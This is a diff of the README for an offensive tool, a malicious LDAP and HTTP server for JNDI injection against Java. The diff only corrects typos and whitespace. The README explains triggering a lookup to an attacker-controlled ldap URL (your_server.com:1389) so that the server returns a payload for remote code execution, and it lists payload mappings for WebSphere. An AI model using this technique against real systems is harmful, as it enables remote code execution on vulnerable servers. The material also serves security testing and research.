@@ -3,11 +3,11 @@ A malicious LDAP server for JNDI injection attacks.
 
 ### Description
 The project contains LDAP & HTTP servers for exploiting insecure-by-default Java JNDI API.<br> 
-In order to perform an attack, you can start these servers localy and then trigger a JNDI resolution on the vulnerable client, e.g.: 
+In order to perform an attack, you can start these servers locally and then trigger a JNDI resolution on the vulnerable client, e.g.:
 ```java
 InitialContext.lookup("ldap://your_server.com:1389/o=reference");
 ```
-It will initiate a connection from the vulnerable clinet to the local LDAP server. 
+It will initiate a connection from the vulnerable client to the local LDAP server.
 Then, the local server responds with a malicious entry containing one of the payloads, that can be useful to achieve a Remote Code Execution. 
 
 ### Motivation
@@ -61,7 +61,6 @@ Mapping ldap://192.168.1.10:1389/o=websphere1,wsdl=* to artsploit.controllers.We
 Mapping ldap://192.168.1.10:1389/o=websphere2 to artsploit.controllers.WebSphere2
 Mapping ldap://192.168.1.10:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
 ```
-
 
 ### Building
 Java v1.7+ and Maven v3+ required
